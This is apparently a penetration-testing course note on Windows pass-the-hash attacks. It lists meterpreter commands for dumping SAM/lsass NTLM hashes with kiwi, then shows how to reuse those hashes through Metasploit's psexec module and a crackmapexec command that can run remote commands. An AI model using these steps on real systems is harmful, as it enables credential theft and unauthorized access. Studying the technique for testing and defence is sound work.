# Pass-The-Hash Attacks

## Pass-The-Hash

* Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
* We can use multiple tools to facilitate a Pass-The-Hash attack:
  * Metasploit PsExec module
  * Crackmapexec

This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

## Practical Demo

After gaining a meterpreter session as the administrator run:

* <mark style="color:yellow;">pgrep lsass</mark>
* <mark style="color:yellow;">migrate PID</mark>
* <mark style="color:yellow;">load kiwi</mark>
* <mark style="color:yellow;">lsa\_dump\_sam</mark>

Get the Administrator NTLM hash.

### Pass-the-Hash using PSExec module

<mark style="color:purple;">NOTE:</mark> To  perform this using PSExec module you need the LM and NTLM hash...use <mark style="color:red;">hashdump</mark> in meterpreter

Background the meterpreter session, to search for the PSExec module.

* <mark style="color:yellow;">exploit/windows/smb/psexec</mark>: Choose the authenticated one

This module accepts <mark style="color:red;">SMBuser</mark> and <mark style="color:red;">SMBpass</mark>.

You can pass it the <mark style="color:blue;">NTLM/LM</mark> hash as the pass.

<mark style="color:purple;">NOTE:</mark> Be aware to set the <mark style="color:red;">LPORT</mark> to be different from the initial session.

### crackmapexec

We can use this tool to also perform a pass-the-hash attack.

#### Commands:

* <mark style="color:yellow;">crackmapexec smb 'targetIP' -u Administrator -H 'NTLMHASH'</mark>&#x20;

You can also pass a clear text password by changing the <mark style="color:red;">-H</mark> to <mark style="color:red;">-p.</mark>

#### To execute commands add:

* <mark style="color:yellow;">-x 'commandtorun'</mark>
